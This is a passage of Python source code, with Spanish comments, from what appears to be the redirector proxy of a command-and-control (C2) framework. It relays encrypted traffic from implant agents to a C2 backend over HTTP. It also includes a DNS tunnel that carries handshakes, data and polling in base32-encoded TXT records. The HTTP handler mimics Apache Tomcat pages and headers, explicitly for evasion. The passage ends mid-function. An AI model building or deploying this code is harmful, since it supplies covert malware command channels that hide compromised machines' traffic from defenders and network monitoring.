                if not len_bytes:
                    logger.debug(f"Backend cerró conexión para {self.ip}")
                    break
                
                msg_len = struct.unpack('!I', len_bytes)[0]
                
                if msg_len == 0:
                    continue
                
                # Leer el mensaje completo
                msg_data = self._recv_exact(sock, msg_len)
                
                if not msg_data:
                    break
                
                # Encolar el mensaje completo
                full_message = len_bytes + msg_data
                
                with self.message_lock:
                    self.pending_messages.append(full_message)
                    logger.debug(f"Mensaje encolado para {self.ip}: {len(full_message)} bytes")
                
                sock.settimeout(None)
                
            except socket.timeout:
                continue
            except Exception as e:
                logger.debug(f"Error en reader loop: {e}")
                break
        
        logger.debug(f"Reader thread terminado para {self.ip}")
    
    def _recv_exact(self, sock, n):
        """Recibe exactamente n bytes."""
        data = b''
        while len(data) < n:
            try:
                chunk = sock.recv(n - len(data))
                if not chunk:
                    return None
                data += chunk
            except:
                return None
        return data
    
    def get_pending_message(self):
        """Obtiene un mensaje pendiente de la cola."""
        with self.message_lock:
            if self.pending_messages:
                return self.pending_messages.popleft()
            return None
    
    def has_pending_messages(self):
        """Verifica si hay mensajes pendientes."""
        with self.message_lock:
            return len(self.pending_messages) > 0
    
    def _redo_handshake_on_reconnect(self, new_sock):
        """Rehace el handshake después de reconexión."""
        if not self.handshake_complete or not self.encrypted_aes_key:
            return False
        
        try:
            logger.info(f"Rehaciendo handshake en reconexión")
            
            new_sock.settimeout(30.0)
            banner_data = new_sock.recv(1024)
            if not banner_data:
                return False
            
            new_sock.sendall(b"REQUEST_PUBKEY")
            
            pubkey_data = new_sock.recv(8192)
            if not pubkey_data or not pubkey_data.startswith(b'ECDH_PUBKEY:'):
                return False
            
            new_sock.sendall(self.encrypted_aes_key)
            
            new_sock.settimeout(None)
            
            logger.info(f"Handshake rehecho exitosamente")
            return True
            
        except Exception as e:
            logger.error(f"Error rehaciendo handshake: {e}")
            return False
    
    def get_or_create_backend_connection(self):
        """Obtiene o crea conexión backend."""
        with self.lock:
            self.last_activity = time.time()
            
            if self._is_socket_valid(self.backend_sock):
                return self.backend_sock
            
            if self.backend_sock:
                connection_pool.close_connection(self.backend_sock)
                self.backend_sock = None
            
            self.reader_stop_event.set()
            
            logger.info(f"Creando conexión backend para {self.ip}")
            new_sock = connection_pool.get_connection()
            
            if not new_sock:
                return None
            
            if not self._is_socket_valid(new_sock):
                connection_pool.close_connection(new_sock)
                return None
            
            if self.handshake_complete and self.encrypted_aes_key:
                if not self._redo_handshake_on_reconnect(new_sock):
                    connection_pool.close_connection(new_sock)
                    return None
            
            self.backend_sock = new_sock
            self.reconnect_attempted = False
            
            if self.handshake_complete:
                self._start_reader_thread()
            
            return self.backend_sock
    
    def safe_send_backend(self, data):
        """Envía datos al backend con manejo de errores."""
        with self.lock:
            if not self._is_socket_valid(self.backend_sock):
                self.backend_sock = None
                self.reconnect_attempted = False
                
                if not self.get_or_create_backend_connection():
                    return False
            
            try:
                self.backend_sock.sendall(data)
                self.last_activity = time.time()
                return True
            
            except (BrokenPipeError, OSError) as e:
                logger.warning(f"Error en sendall: {e}")
                
                if self.reconnect_attempted:
                    return False
                
                connection_pool.close_connection(self.backend_sock)
                self.backend_sock = None
                self.reconnect_attempted = True
                
                new_sock = connection_pool.get_connection()
                if not new_sock or not self._is_socket_valid(new_sock):
                    if new_sock:
                        connection_pool.close_connection(new_sock)
                    return False
                
                if self.handshake_complete and self.encrypted_aes_key:
                    if not self._redo_handshake_on_reconnect(new_sock):
                        connection_pool.close_connection(new_sock)
                        return False
                
                self.backend_sock = new_sock
                
                try:
                    self.backend_sock.sendall(data)
                    self.last_activity = time.time()
                    self.reconnect_attempted = False
                    return True
                except Exception:
                    connection_pool.close_connection(self.backend_sock)
                    self.backend_sock = None
                    return False
            
            except Exception:
                connection_pool.close_connection(self.backend_sock)
                self.backend_sock = None
                return False
    
    def mark_handshake_complete(self):
        with self.lock:
            self.handshake_complete = True
            self.last_activity = time.time()
            self._start_reader_thread()
            logger.info(f"Handshake completo para {self.ip}")
    
    def close(self):
        """Cierra la sesión de forma segura - CORREGIDO."""
        logger.info(f"[{self.session_id[:8]}] Cerrando sesión para {self.ip}")
        self.reader_stop_event.set()
        
        with self.lock:
            self.closed = True
            if self.backend_sock:
                try:
                    self.backend_sock.shutdown(socket.SHUT_RDWR)
                except:
                    pass
                try:
                    connection_pool.close_connection(self.backend_sock)
                except:
                    pass
                self.backend_sock = None
            self.handshake_complete = False
            self.reconnect_attempted = False
            self.encrypted_aes_key = None
            self.pubkey_data = None
            # Cerrar socket de handshake si quedó abierto
            if self._hs_sock:
                try: self._hs_sock.close()
                except: pass
                self._hs_sock = None
        
        with self.message_lock:
            self.pending_messages.clear()

def get_or_create_http_session(session_id, ip):
    """Obtiene o crea una sesión HTTP usando X-Session-ID como clave."""
    with http_sessions_lock:
        # Usar session_id como clave primaria (UUID del cliente)
        if session_id in http_sessions:
            session = http_sessions[session_id]
            session.update_activity()
            logger.debug(f"[{session.session_id[:8]}] Sesión existente reutilizada para {ip}")
            return session
        
        # Crear nueva sesión con el UUID del cliente
        new_session = HTTPSession(ip, session_id)
        http_sessions[session_id] = new_session
        logger.info(f"[{new_session.session_id[:8]}] Creando nueva sesión HTTP para {ip} (UUID: {session_id[:8]})")
        new_session.update_activity()
        return new_session

        
        # Crear nueva sesión con UUID para tracking interno
        new_session = HTTPSession(ip, session_id)
        http_sessions[ip] = new_session
        logger.info(f"[{new_session.session_id[:8]}] Creando nueva sesión HTTP para {ip}")
        new_session.update_activity()
        return new_session

def cleanup_expired_sessions():
    """Limpia sesiones expiradas - CORREGIDO para IP como clave."""
    while proxy_running:
        try:
            time.sleep(HTTP_SESSION_CLEANUP_INTERVAL)
            with http_sessions_lock:
                active_sessions = len(http_sessions)
                if active_sessions > 0:
                    logger.debug(f"Sesiones HTTP activas: {active_sessions}")
                    for session_id, session in list(http_sessions.items()):
                        logger.debug(f"  SessionID={session_id[:8]} IP={session.ip} Handshake={session.handshake_complete}")
        except Exception as e:
            logger.error(f"Error en monitor de sesiones: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
#  DNS C2 BRIDGE  ─  protocolo 1:1 con BlackBerryC2_server.py
# ═══════════════════════════════════════════════════════════════════════════════

class _DSession:
    """
    Estado mínimo de puente por agente DNS.
    No hace crypto. Solo mantiene sockets TCP al backend C2.
    """
    __slots__ = (
        "sid", "addr",
        # Fase 1 handshake (REQUEST_PUBKEY → ECDH_PUBKEY)
        "hs_sock", "hs_lock", "hs_phase",
        # Socket activo post-handshake
        "back_sock", "back_lock",
        # Cola de respuestas del C2 (llenada por reader thread)
        "pending", "pend_lock",
        "reader_th", "reader_stop",
        # Fragmentos en tránsito (multi-query)
        "frags", "frag_ts",
        # Métricas
        "last_seen", "rx", "tx",
        # Flag: llegó a hs_phase==2 al menos una vez
        "connected_once",
    )

    def __init__(self, sid, addr):
        self.sid            = sid
        self.addr           = addr
        self.hs_sock        = None
        self.hs_lock        = threading.Lock()
        self.hs_phase       = 0          # 0=nuevo 1=h1-hecho 2=activo
        self.back_sock      = None
        self.back_lock      = threading.Lock()
        self.pending        = deque(maxlen=256)
        self.pend_lock      = threading.Lock()
        self.reader_th      = None
        self.reader_stop    = threading.Event()
        self.frags          = {}
        self.frag_ts        = {}
        self.last_seen      = time.time()
        self.rx = self.tx   = 0
        self.connected_once = False   # True en cuanto hs_phase llega a 2

    def touch(self): self.last_seen = time.time()
    def alive(self): return time.time() - self.last_seen < DNS_SESSION_TTL

    @staticmethod
    def _sock_ok(s) -> bool:
        if not s:
            return False
        try:
            if s.fileno() < 0:
                return False
            _, _, err = select.select([], [s], [s], 0)
            return not bool(err)
        except Exception:
            return False

    def close(self):
        self.reader_stop.set()
        with self.hs_lock:
            if self.hs_sock:
                try: self.hs_sock.close()
                except: pass
                self.hs_sock = None
        with self.back_lock:
            if self.back_sock:
                try: self.back_sock.shutdown(socket.SHUT_RDWR)
                except: pass
                try: self.back_sock.close()
                except: pass
                self.back_sock = None
        self.hs_phase = 0


# ── Codec Base32 / labels ─────────────────────────────────────────────────────
def _b32e(data: bytes) -> str:
    return base64.b32encode(data).decode().lower().rstrip("=")

def _b32d(s: str) -> bytes:
    s = s.upper()
    s += "=" * ((8 - len(s) % 8) % 8)
    return base64.b32decode(s)

def _pack_labels(data: bytes) -> list:
    enc = _b32e(data)
    return [enc[i:i+DNS_LABEL_MAX] for i in range(0, len(enc), DNS_LABEL_MAX)]

def _unpack_labels(labels: list) -> bytes:
    return _b32d("".join(labels))


# ── Parser qname ──────────────────────────────────────────────────────────────
def _parse_qname(qname: str, domain: str):
    """
    {op2}{cn:02x}{ct:02x}.{sid8}.{lbl…}.{domain}
    Devuelve (op, cn, ct, sid, payload_bytes) o None.
    """
    q   = str(qname).rstrip(".")
    dom = domain.rstrip(".")
    if not q.endswith("." + dom):
        return None
    q = q[:-(len(dom) + 1)]
    parts = q.split(".")
    if len(parts) < 2 or len(parts[0]) < 6:
        return None
    meta = parts[0]
    op = meta[:2]
    try:
        cn = int(meta[2:4], 16)
        ct = int(meta[4:6], 16)
    except ValueError:
        return None
    sid    = parts[1]
    labels = [p for p in parts[2:] if p not in ("x", "y", "z")]
    try:
        payload = _unpack_labels(labels) if labels else b""
    except Exception:
        payload = b""
    return op, cn, ct, sid, payload


# ── Constructores de paquetes DNS ─────────────────────────────────────────────
def _dns_ok(qname, qid: int, records: list) -> bytes:
    try:
        hdr = _dnslib.DNSHeader(id=qid, qr=1, aa=1, ra=0, rcode=0)
        rep = _dnslib.DNSRecord(hdr, q=_dnslib.DNSQuestion(qname, _dnslib.QTYPE.TXT))
        for r in records:
            r = r if isinstance(r, bytes) else r.encode()
            rep.add_answer(
                _dnslib.RR(qname, _dnslib.QTYPE.TXT, ttl=0,
                           rdata=_dnslib.TXT([r]))
            )
        return rep.pack()
    except Exception:
        return b""

def _dns_err(qname, qid: int) -> bytes:
    try:
        hdr = _dnslib.DNSHeader(id=qid, qr=1, aa=1, ra=0, rcode=3)
        rep = _dnslib.DNSRecord(hdr, q=_dnslib.DNSQuestion(qname, _dnslib.QTYPE.TXT))
        return rep.pack()
    except Exception:
        return b""


# ── Helpers TCP ───────────────────────────────────────────────────────────────
def _recvn(sock, n: int) -> bytes | None:
    data = b""
    while len(data) < n:
        try:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        except Exception:
            return None
    return data

def _read_c2_banner(sock, timeout: float = 10.0):
    """
    Lee y descarta el banner SSH que envía el C2 antes de REQUEST_PUBKEY.
    Igual a _recv_full_banner en HTTPSession.
    """
    try:
        sock.settimeout(timeout)
        buf = b""
        while True:
            r, _, _ = select.select([sock], [], [], 1.0)
            if not r:
                break
            chunk = sock.recv(2048 - len(buf))
            if not chunk:
                break
            buf += chunk
            if b"\n" in buf or len(buf) >= 2048:
                break
        sock.settimeout(None)
    except Exception:
        pass


# ── Reader de backend (espejo de _backend_reader_loop en HTTPSession) ─────────
def _dns_reader(sess: _DSession):
    """
    Lee [4B len][body] del C2 y encola en sess.pending.
    Si el C2 cierra la conexión, marca hs_phase=0 para forzar re-handshake.
    """
    with sess.back_lock:
        sock = sess.back_sock

    _dns_log(f"  reader arrancado [{sess.sid[:8]}]")

    while not sess.reader_stop.is_set():
        try:
            r, _, _ = select.select([sock], [], [], 1.0)
            if not r:
                continue
            sock.settimeout(10.0)
            len_b = _recvn(sock, 4)
            if not len_b:
                _dns_log(f"  C2 cerró [{sess.sid[:8]}] — marcando para re-HS")
                break
            msg_len = struct.unpack("!I", len_b)[0]
            if msg_len == 0:
                # keepalive vacío — encolar [4B 0] para que el agente lo reciba
                with sess.pend_lock:
                    sess.pending.append(len_b)
            elif msg_len > 10 * 1024 * 1024:
                _dns_log(f"  Mensaje C2 demasiado grande [{sess.sid[:8]}]: {msg_len}B — descartando")
            else:
                body = _recvn(sock, msg_len)
                if not body:
                    break
                with sess.pend_lock:
                    sess.pending.append(len_b + body)
            sock.settimeout(None)
        except socket.timeout:
            continue
        except Exception as e:
            _dns_log(f"  reader error [{sess.sid[:8]}]: {e}")
            break

    # Limpiar socket muerto
    with sess.back_lock:
        if sess.back_sock is sock:
            try: sock.close()
            except: pass
            sess.back_sock = None
    sess.hs_phase = 0
    _dns_log(f"  reader terminado [{sess.sid[:8]}]")


def _start_reader(sess: _DSession):
    if sess.reader_th and sess.reader_th.is_alive():
        return
    sess.reader_stop.clear()
    th = threading.Thread(target=_dns_reader, args=(sess,), daemon=True)
    th.start()
    sess.reader_th = th


# ── Gestión de sesiones ───────────────────────────────────────────────────────
def _get_sess(sid: str, addr: tuple) -> _DSession:
    with _dns_sessions_lock:
        if sid not in _dns_sessions:
            _dns_sessions[sid] = _DSession(sid, addr)
            _dns_log(f"[+] Nueva sesión DNS [{sid[:8]}] desde {addr[0]}")
        s = _dns_sessions[sid]
        s.addr = addr
        s.touch()
        return s

def _dns_gc_loop():
    """GC: elimina sesiones inactivas."""
    while _dns_alive:
        time.sleep(180)
        with _dns_sessions_lock:
            dead = [sid for sid, s in _dns_sessions.items() if not s.alive()]
            for sid in dead:
                try: _dns_sessions[sid].close()
                except: pass
                del _dns_sessions[sid]
                _dns_log(f"[~] Sesión expirada [{sid[:8]}]")

def _dns_log(msg: str):
    ts = time.strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    try: _dns_log_q.put_nowait(line)
    except: pass
    _dlog.info(msg)


# ── Fragmentación multi-query ─────────────────────────────────────────────────
def _reassemble(sess: _DSession, op: str, cn: int, ct: int, chunk: bytes):
    key = f"{op}:{ct}"
    now = time.time()
    if key not in sess.frags or (now - sess.frag_ts.get(key, 0)) > DNS_FRAG_AGE:
        sess.frags[key]   = {}
        sess.frag_ts[key] = now
    sess.frags[key][cn] = chunk
    if len(sess.frags[key]) == ct:
        data = b"".join(sess.frags[key][i] for i in range(ct))
        del sess.frags[key], sess.frag_ts[key]
        return data
    return None


# ── Handlers por opcode ───────────────────────────────────────────────────────

def _op_h1(sess: _DSession, qname, qid: int) -> bytes:
    """
    FASE 1 — Idéntico a HTTPWrappedHandler._handle_request_pubkey:
      - Abre TCP al C2
      - Lee y descarta banner SSH
      - Envía raw b"REQUEST_PUBKEY"
      - Lee b"ECDH_PUBKEY:" + PEM (puede llegar en segmentos)
      - Cachea socket en sess.hs_sock
      - Devuelve PEM codificado como TXT base32
    """
    # Cerrar socket de HS anterior si hubo retry
    with sess.hs_lock:
        if sess.hs_sock:
            try: sess.hs_sock.close()
            except: pass
            sess.hs_sock  = None
        sess.hs_phase = 0

    sock = connection_pool.get_connection() if connection_pool else None
    if not sock:
        _dns_log(f"[!] h1: sin backend para [{sess.sid[:8]}]")
        return _dns_err(qname, qid)

    try:
        sock.settimeout(30.0)
        apply_advanced_socket_options(sock)

        _read_c2_banner(sock)                   # descartar banner SSH

        sock.sendall(b"REQUEST_PUBKEY")

        # Leer ECDH_PUBKEY:PEM — puede llegar en múltiples segmentos TCP
        pub_data = b""
        while b"-----END PUBLIC KEY-----" not in pub_data:
            chunk = sock.recv(8192)
            if not chunk:
                raise ConnectionError("C2 cerró durante h1")
            pub_data += chunk
            if len(pub_data) > 32768:
                raise ValueError("PEM demasiado grande")

        if not pub_data.startswith(b"ECDH_PUBKEY:"):
            raise ValueError(f"Respuesta inesperada: {pub_data[:60]!r}")

        sock.settimeout(None)

        with sess.hs_lock:
            sess.hs_sock  = sock
            sess.hs_phase = 1

        _dns_log(f"[+] h1 OK [{sess.sid[:8]}] {sess.addr[0]} — pubkey {len(pub_data)}B")

        # Codificar como TXT base32 (múltiples registros si es necesario)
        b32  = _b32e(pub_data)
        recs = [b32[i:i+DNS_TXT_CHUNK].encode() for i in range(0, len(b32), DNS_TXT_CHUNK)]
        return _dns_ok(qname, qid, recs)

    except Exception as e:
        _dns_log(f"[!] h1 error [{sess.sid[:8]}]: {e}")
        try: sock.close()
        except: pass
        return _dns_err(qname, qid)


def _op_h2(sess: _DSession, payload: bytes, qname, qid: int) -> bytes:
    """
    FASE 2 — Idéntico a HTTPWrappedHandler._handle_ecdhe_payload:
      payload = [4B len][PEM cliente][32B HMAC]

      - Obtiene el socket de h1
      - Envía el payload RAW al C2 (sin framing extra)
      - El C2 NO responde (a diferencia del canal HTTP donde el PROXY genera "OK")
      - Mueve el socket a back_sock
      - Arranca el reader thread
      - Genera "OK" para el agente DNS (el proxy lo genera, no el C2)
    """
    with sess.hs_lock:
        hs_sock   = sess.hs_sock
        hs_phase  = sess.hs_phase

    if not hs_sock or hs_phase != 1:
        _dns_log(f"[!] h2 sin socket h1 [{sess.sid[:8]}] — reintentar h1")
        return _dns_err(qname, qid)

    try:
        hs_sock.settimeout(15.0)
        hs_sock.sendall(payload)    # [4B len][PEM][32B HMAC] — RAW, sin framing extra
        hs_sock.settimeout(None)

        # Limpiar hs_sock y promover a back_sock
        with sess.hs_lock:
            sess.hs_sock  = None
        with sess.back_lock:
            if sess.back_sock:
                try: connection_pool.close_connection(sess.back_sock)
                except: pass
            sess.back_sock      = hs_sock
            sess.hs_phase       = 2
            sess.connected_once = True    # nunca volver a WAIT silencioso

        _start_reader(sess)
        _dns_log(f"[+] h2 OK [{sess.sid[:8]}] {sess.addr[0]} — canal activo ✓")

        # El proxy genera el OK (el C2 no envía nada tras h2 para canal TCP)
        return _dns_ok(qname, qid, [b"OK"])

    except Exception as e:
        _dns_log(f"[!] h2 error [{sess.sid[:8]}]: {e}")
        with sess.hs_lock:
            try: sess.hs_sock.close()
            except: pass
            sess.hs_sock  = None
        sess.hs_phase = 0
        return _dns_err(qname, qid)


def _op_dt(sess: _DSession, payload: bytes, qname, qid: int) -> bytes:
    """
    Datos del agente → reenviar RAW al C2.
    payload ya es [4B len][cifrado] — IGUAL que safe_send_backend.
    No añadir framing extra.
    """
    if sess.hs_phase != 2:
        _dns_log(f"[!] dt rechazado [{sess.sid[:8]}] — sin handshake")
        return _dns_err(qname, qid)

    with sess.back_lock:
        sock = sess.back_sock

    if not sock or not _DSession._sock_ok(sock):
        _dns_log(f"[!] dt sin backend [{sess.sid[:8]}] — forzar re-HS")
        sess.hs_phase = 0
        return _dns_err(qname, qid)

    try:
        sock.sendall(payload)   # RAW — el payload ya lleva el 4B prefix
        sess.tx += len(payload)
        return _dns_ok(qname, qid, [b"ACK"])
    except Exception as e:
        _dns_log(f"[!] dt send error [{sess.sid[:8]}]: {e}")
        sess.hs_phase = 0
        return _dns_err(qname, qid)


def _op_po(sess: _DSession, qname, qid: int) -> bytes:
    """
    Poll: devuelve datos del C2 si hay, o WAIT.
    Si el backend TCP murió (hs_phase volvió a 0 tras estar activo) devuelve NXDOMAIN
    para que el agente sepa que debe reconectar — no más WAIT silencioso.
    """
    if sess.hs_phase != 2:
        if sess.connected_once:
            # La conexión TCP al backend se cayó — señalar al agente
            return _dns_err(qname, qid)    # NXDOMAIN = DEAD
        return _dns_ok(qname, qid, [b"WAIT"])   # nunca llegó a conectarse

    # Comprobar cola primero (sin bloquear)
    with sess.pend_lock:
        if sess.pending:
            msg  = sess.pending.popleft()
            sess.rx += len(msg)
            b32  = _b32e(msg)
            recs = [b32[i:i+DNS_TXT_CHUNK].encode() for i in range(0, len(b32), DNS_TXT_CHUNK)]
            return _dns_ok(qname, qid, recs)

    # Espera corta (400ms) — reduce frecuencia de polls del agente
    with sess.back_lock:
        sock = sess.back_sock
    if sock and _DSession._sock_ok(sock):
        r, _, _ = select.select([sock], [], [], 0.4)
        if r:
            with sess.pend_lock:
                if sess.pending:
                    msg  = sess.pending.popleft()
                    sess.rx += len(msg)
                    b32  = _b32e(msg)
                    recs = [b32[i:i+DNS_TXT_CHUNK].encode()
                            for i in range(0, len(b32), DNS_TXT_CHUNK)]
                    return _dns_ok(qname, qid, recs)

    return _dns_ok(qname, qid, [b"WAIT"])


def _op_hb(sess: _DSession, qname, qid: int) -> bytes:
    """
    Heartbeat.
    - Si la sesión está activa (hs_phase==2) → HB_ACK siempre.
      El reader thread es quien detecta caídas TCP; no intentamos
      detectarlas aquí con _sock_ok (que solo detecta errores, no cierre por peer).
    - Si la sesión murió (hs_phase==0 + connected_once) → NXDOMAIN.
      Esto ocurre cuando el reader thread ya marcó hs_phase=0.
    """
    if sess.hs_phase == 2:
        sess.touch()
        return _dns_ok(qname, qid, [b"HB_ACK"])
    if sess.connected_once:
        # Sesión que estuvo activa y ahora está muerta → señalar al agente
        return _dns_err(qname, qid)   # NXDOMAIN
    # Sesión nueva que nunca llegó a fase 2 → HB_ACK (puede ser una carrera)
    return _dns_ok(qname, qid, [b"HB_ACK"])


# ── Dispatcher UDP ────────────────────────────────────────────────────────────
def _dns_dispatch(raw: bytes, addr: tuple, srv_sock):
    try:
        req = _dnslib.DNSRecord.parse(raw)
    except Exception:
        return
    if not req.questions:
        return

    q     = req.questions[0]
    qname = str(q.qname)
    qid   = req.header.id

    if q.qtype != _dnslib.QTYPE.TXT:
        return

    domain = proxy_config.get("dns_domain", DNS_DEFAULT_DOMAIN)
    if domain not in qname:
        return

    parsed = _parse_qname(qname, domain)
    if not parsed:
        return

    op, cn, ct, sid, frag = parsed
    sess = _get_sess(sid, addr)

    # Reensamblar si multi-query
    if ct > 1:
        payload = _reassemble(sess, op, cn, ct, frag)
        if payload is None:
            # Fragmento intermedio — ACK inmediato para que el agente envíe el siguiente
            try: srv_sock.sendto(_dns_ok(qname, qid, [b"ACK"]), addr)
            except Exception: pass
            return
    else:
        payload = frag

    if   op == "h1": resp = _op_h1(sess, qname, qid)
    elif op == "h2": resp = _op_h2(sess, payload, qname, qid)
    elif op == "dt": resp = _op_dt(sess, payload, qname, qid)
    elif op == "po": resp = _op_po(sess, qname, qid)
    elif op == "hb": resp = _op_hb(sess, qname, qid)
    else:            resp = _dns_err(qname, qid)

    if resp:
        try:
            srv_sock.sendto(resp, addr)
        except Exception as e:
            _dlog.debug(f"sendto: {e}")


# ── Listener UDP ──────────────────────────────────────────────────────────────
def _dns_listener(srv_sock):
    port   = proxy_config.get("dns_port",   DNS_DEFAULT_PORT)
    domain = proxy_config.get("dns_domain", DNS_DEFAULT_DOMAIN)
    target = f"{proxy_config.get('target_host')}:{proxy_config.get('target_port')}"
    _dns_log(f"[*] DNS Bridge escuchando — UDP:{port} | dominio: {domain} | backend → {target}")

    while _dns_alive:
        try:
            raw, addr = srv_sock.recvfrom(4096)
            threading.Thread(
                target=_dns_dispatch, args=(raw, addr, srv_sock), daemon=True
            ).start()
        except OSError:
            break
        except Exception as e:
            _dlog.debug(f"listener: {e}")


# ── Arrancar / detener ────────────────────────────────────────────────────────
def start_dns_bridge(log_func) -> bool:
    global _dns_alive, _dns_srv_sock
    if not DNSLIB_AVAILABLE:
        log_func("[DNS] dnslib no disponible — pip install dnslib")
        return False
    if _dns_alive:
        return True
    port = proxy_config.get("dns_port", DNS_DEFAULT_PORT)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        _dns_srv_sock = s
        _dns_alive    = True
        threading.Thread(target=_dns_listener, args=(s,),  daemon=True).start()
        threading.Thread(target=_dns_gc_loop,              daemon=True).start()
        log_func(f"[DNS] Bridge activo — UDP:{port}")
        return True
    except PermissionError:
        log_func(f"[DNS] Permiso denegado en puerto {port} — ejecuta con sudo")
    except OSError as e:
        if "in use" in str(e).lower():
            log_func(f"[DNS] Puerto {port} en uso — systemctl stop systemd-resolved")
        else:
            log_func(f"[DNS] Error bind: {e}")
    except Exception as e:
        log_func(f"[DNS] Error: {e}")
    _dns_alive = False
    return False


def stop_dns_bridge(log_func=None):
    global _dns_alive, _dns_srv_sock
    if not _dns_alive:
        return
    _dns_alive = False
    if _dns_srv_sock:
        try: _dns_srv_sock.close()
        except: pass
        _dns_srv_sock = None
    with _dns_sessions_lock:
        for s in _dns_sessions.values():
            try: s.close()
            except: pass
        cnt = len(_dns_sessions)
        _dns_sessions.clear()
    msg = f"[DNS] Bridge detenido ({cnt} sesiones)"
    if log_func: log_func(msg)
    _dlog.info(msg)

# ============ SERVIDOR HTTP THREADED ============
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Servidor HTTP con soporte para múltiples threads."""
    daemon_threads = True
    allow_reuse_address = True

# ============ HTTP HANDLER ============
class HTTPWrappedHandler(BaseHTTPRequestHandler):
    """Handler HTTP para el proxy sintético."""
    
    blocked_ips = set()
    protocol_version = 'HTTP/1.1'
    


    timeout = HTTP_HEADER_TIMEOUT
    
    def __init__(self, *args, **kwargs):
        self.start_time = time.time()
        self.bytes_received = 0
        super().__init__(*args, **kwargs)
    
    def handle(self):
        try:
            self.connection.settimeout(HTTP_HEADER_TIMEOUT)
            super().handle()
        except socket.timeout:
            logger.warning(f"Timeout en headers desde {self.client_address[0]}")
            self.close_connection = True
        except Exception as e:
            logger.debug(f"Error en handle: {e}")
            self.close_connection = True
    
    def parse_request(self):
        try:
            result = super().parse_request()
            if result:
                headers_size = sum(len(k) + len(v) + 4 for k, v in self.headers.items())
                if headers_size > HTTP_MAX_HEADER_SIZE:
                    logger.warning(f"Headers demasiado grandes desde {self.client_address[0]}: {headers_size}")
                    self.send_error(431, "Request Header Fields Too Large")
                    return False
            return result
        except Exception as e:
            logger.debug(f"Error parseando request: {e}")
            return False
    
    def _check_transfer_speed(self, data_len):
        elapsed = time.time() - self.start_time
        self.bytes_received += data_len
        if elapsed > 1:
            speed = self.bytes_received / elapsed
            if speed < HTTP_MIN_SPEED:
                logger.warning(f"Velocidad muy lenta desde {self.client_address[0]}: {speed:.1f} B/s")
                return False
        return True

    def _add_tomcat_headers(self):
        """Agrega headers típicos de Apache Tomcat."""
        self.send_header('Server', TOMCAT_SERVER_HEADER)
        self.send_header('Accept-Ranges', 'bytes')
        self.send_header('ETag', f'W/"{int(time.time())}-{os.getpid()}"')
    
    def _send_tomcat_404(self):
        """Envía la página 404 estilo Tomcat."""
        try:
            body = TOMCAT_404_PAGE.encode('utf-8')
            self.send_response(404)
            self.send_header('Content-Type', 'text/html;charset=utf-8')
            self.send_header('Content-Length', str(len(body)))
            self._add_tomcat_headers()
            self.send_header('Connection', 'close')
            self.end_headers()
            self.wfile.write(body)
        except:
            pass
    
    def _send_tomcat_401(self):
        """Envía la página 401 estilo Tomcat Manager."""
        try:
            body = TOMCAT_MANAGER_401_PAGE.encode('utf-8')
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'Basic realm="Tomcat Manager Application"')
            self.send_header('Content-Type', 'text/html;charset=utf-8')
            self.send_header('Content-Length', str(len(body)))
            self._add_tomcat_headers()
            self.send_header('Connection', 'close')
            self.end_headers()
            self.wfile.write(body)
        except:
            pass
    
    def _send_tomcat_root(self):
        """Envía la página raíz de Tomcat."""
        try:
            body = TOMCAT_ROOT_PAGE.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-Type', 'text/html;charset=utf-8')
            self.send_header('Content-Length', str(len(body)))
            self._add_tomcat_headers()
            self.send_header('Connection', 'keep-alive')
            self.end_headers()
            self.wfile.write(body)
        except:
            pass
    
    def _is_c2_endpoint(self, path):
        """Verifica si es un endpoint C2.
        Orden: lista estática → wildcards → perfil activo auto.
        """
        eps = proxy_config.get('endpoints', [])
        # Coincidencia exacta en lista configurada
        if path in eps: return True
        # Wildcard /* en lista
        for ep in eps:
            if ep.endswith('/*') and path.startswith(ep[:-1]): return True
        # Perfil activo: cualquier URI del perfil es válida
        if _PROFILES_AVAILABLE:
            prof = get_active_profile()
            if prof:
                _, matched = prof.match_task(path)
                return matched
        return False

    def _endpoint_task(self, path: str) -> str:
        """Retorna la tarea asignada al path.
        Orden: lista estática → wildcards → perfil activo → 'message'.
        """
        tm = proxy_config.get('endpoint_tasks', {})
        # Exacto en config manual
        if path in tm: return tm[path]
        # Wildcard /*
        for pat, task in tm.items():
            if pat.endswith('/*') and path.startswith(pat[:-1]): return task
        # Perfil activo: infiere la tarea automáticamente
        if _PROFILES_AVAILABLE:
            prof = get_active_profile()
            if prof:
                task, matched = prof.match_task(path)
                if matched: return task
        return 'message'
    
    def _handle_fake_tomcat_endpoint(self, path):
        """Maneja endpoints falsos de Tomcat para evasión."""
        if path == '/' or path == '':
            self._send_tomcat_root()
            return True
        elif path.startswith('/manager') or path.startswith('/host-manager'):
            self._send_tomcat_401()
            return True
        elif path.startswith('/docs') or path.startswith('/examples'):
            self._send_tomcat_404()
            return True
        return False
    
    
    def do_HEAD(self):
        """Maneja peticiones HEAD simulando Tomcat."""
        ip = self.client_address[0]
        path = urlparse(self.path).path
        
        logger.debug(f"HEAD {path} desde {ip}")
        
        if not self._is_c2_endpoint(path):
            if path == '/' or path == '':
                try:
                    body = TOMCAT_ROOT_PAGE.encode('utf-8')
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html;charset=utf-8')
                    self.send_header('Content-Length', str(len(body)))
                    self._add_tomcat_headers()
                    self.send_header('Connection', 'keep-alive')
                    self.end_headers()
                except:
                    pass
            elif path.startswith('/manager') or path.startswith('/host-manager'):
                try:
                    body = TOMCAT_MANAGER_401_PAGE.encode('utf-8')
                    self.send_response(401)
                    self.send_header('WWW-Authenticate', 'Basic realm="Tomcat Manager Application"')
                    self.send_header('Content-Type', 'text/html;charset=utf-8')
                    self.send_header('Content-Length', str(len(body)))
                    self._add_tomcat_headers()
                    self.send_header('Connection', 'close')
                    self.end_headers()
                except:
                    pass
            else:
                try:
                    body = TOMCAT_404_PAGE.encode('utf-8')
                    self.send_response(404)
                    self.send_header('Content-Type', 'text/html;charset=utf-8')
                    self.send_header('Content-Length', str(len(body)))
                    self._add_tomcat_headers()
                    self.send_header('Connection', 'close')
                    self.end_headers()
                except:
                    pass
            return
        
        # Endpoint C2 - responder con headers vacíos
        try:
            self.send_response(200)
